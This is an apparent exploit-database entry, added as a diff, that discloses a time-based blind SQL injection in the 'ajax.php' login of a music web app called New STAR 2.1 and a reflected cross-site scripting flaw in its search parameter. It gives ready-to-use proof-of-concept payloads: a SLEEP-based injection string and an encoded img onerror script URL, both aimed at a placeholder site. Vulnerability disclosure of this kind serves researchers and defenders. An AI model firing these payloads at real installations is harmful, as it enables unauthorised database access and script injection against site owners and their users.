@@ -1,0 +1,31 @@
+# Exploit Title: New STAR 2.1 - SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 30.05.2018
+# Exploit Author: Kağan Çapar
+# Contact: kagancapar@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/new-star-listen-youtube-music/7486113
+# Version: 2.1
+# Category: Webapps
+# Tested on: Kali Linux
+# Description : 'ajax.php' working in the input field contains SQL
+vulnerability. The search section also contains XSS vulnerability.
+====================================================
+
+# PoC : SQLi :
+
+Parameter: name (GET)
+
+    Type: AND/OR time-based blind
+    Demo:
+http://site.com/requests/ajax.php?newstar=login&name=admin&password=123456
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: newstar=login&name=admin' AND SLEEP(5) AND
+'ddni'='ddni&password=123456
+
+
+====================================================
+
+# PoC : XSS :
+
+  Payload(1) :
+http://site.com/play?mouse_search=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E&p=1
